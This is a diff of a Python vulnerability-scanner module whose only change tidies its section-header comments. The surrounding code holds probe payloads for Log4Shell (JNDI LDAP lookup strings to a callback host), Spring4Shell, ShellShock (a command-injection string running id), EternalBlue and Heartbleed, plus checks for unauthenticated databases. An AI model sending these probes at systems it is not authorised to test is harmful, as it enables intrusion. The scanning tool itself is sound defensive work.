@@ -11,8 +11,7 @@ from __future__ import annotations
 import asyncio, struct, socket, urllib.request, urllib.error
 from lightscan.core.engine import ScanResult, Severity
 
-
-# ─── EternalBlue MS17-010 ────────────────────────────────────────────────────
+# EternalBlue MS17-010
 _SMB_NEG = bytes([
     0x00,0x00,0x00,0x54,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
     0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFE,
@@ -51,8 +50,7 @@ async def check_eternalblue(host, port=445, timeout=5.0):
     except Exception as e:
         return ScanResult("cve-ms17-010",host,port,"error",Severity.INFO,str(e))
 
-
-# ─── Log4Shell CVE-2021-44228 ────────────────────────────────────────────────
+# Log4Shell CVE-2021-44228
 LOG4SHELL_HEADERS = ["User-Agent","X-Forwarded-For","X-Api-Version","Referer","Accept-Language","X-Real-IP","Cookie"]
 LOG4SHELL_PAYLOADS = [
     "${jndi:ldap://{{cb}}/a}",
@@ -87,8 +85,7 @@ async def check_log4shell(host, port=80, path="/", timeout=8.0, callback="127.0.
         except Exception: continue
     return ScanResult("cve-log4shell",host,port,"no_response",Severity.INFO,"No HTTP response to probe")
 
-
-# ─── Spring4Shell CVE-2022-22965 ─────────────────────────────────────────────
+# Spring4Shell CVE-2022-22965
 S4S_PAYLOAD = ("class.module.classLoader.resources.context.parent.pipeline"
                ".first.pattern=%25%7Bprefix%7Di java.io.OutputStream%20os")
 
@@ -116,8 +113,7 @@ async def check_spring4shell(host, port=8080, timeout=8.0):
         except Exception: continue
     return ScanResult("cve-spring4shell",host,port,"not_detected",Severity.INFO,"Spring4Shell: no indicator")
 
-
-# ─── Heartbleed CVE-2014-0160 ────────────────────────────────────────────────
+# Heartbleed CVE-2014-0160
 _CLIENT_HELLO = (
     b"\x16\x03\x01\x00\x70\x01\x00\x00\x6c\x03\x03" + b"\x00"*32 +
     b"\x00\x00\x04\x00\x2f\x00\x35\x01\x00\x00\x3f" +
@@ -157,8 +153,7 @@ async def check_heartbleed(host, port=443, timeout=8.0):
     except Exception as e:
         return ScanResult("cve-heartbleed", host, port, "error", Severity.INFO, str(e))
 
-
-# ─── ShellShock CVE-2014-6271 ────────────────────────────────────────────────
+# ShellShock CVE-2014-6271
 SHELLSHOCK = "() { :; }; echo; echo shellshock_$(id)"
 
 async def check_shellshock(host, port=80, timeout=8.0):
@@ -184,8 +179,7 @@ async def check_shellshock(host, port=80, timeout=8.0):
         except Exception: continue
     return ScanResult("cve-shellshock",host,port,"not_detected",Severity.INFO,"ShellShock: no CGI found")
 
-
-# ─── Redis Unauth ─────────────────────────────────────────────────────────────
+# Redis Unauth
 async def check_redis_unauth(host, port=6379, timeout=5.0):
     try:
         r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
@@ -202,8 +196,7 @@ async def check_redis_unauth(host, port=6379, timeout=5.0):
     except Exception as e:
         return ScanResult("redis-unauth",host,port,"error",Severity.INFO,str(e))
 
-
-# ─── MongoDB Unauth ───────────────────────────────────────────────────────────
+# MongoDB Unauth
 async def check_mongo_unauth(host, port=27017, timeout=5.0):
     try:
         r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
@@ -226,8 +219,7 @@ async def check_mongo_unauth(host, port=27017, timeout=5.0):
     except Exception as e:
         return ScanResult("mongo-unauth",host,port,"error",Severity.INFO,str(e))
 
-
-# ─── Elasticsearch Unauth ─────────────────────────────────────────────────────
+# Elasticsearch Unauth
 async def check_elastic_unauth(host, port=9200, timeout=5.0):
     loop = asyncio.get_running_loop()
     def _try():
@@ -248,8 +240,7 @@ async def check_elastic_unauth(host, port=9200, timeout=5.0):
             f"Elasticsearch UNAUTHENTICATED: {detail}",{"service":"Elasticsearch","auth":False})
     return ScanResult("elastic-unauth",host,port,"not_vuln",Severity.INFO,"Elasticsearch: auth required")
 
-
-# ─── CVE Checker Dispatcher ───────────────────────────────────────────────────
+# CVE Checker Dispatcher
 class CVEChecker:
     CHECKS = {
         "eternalblue":    (check_eternalblue,    445),
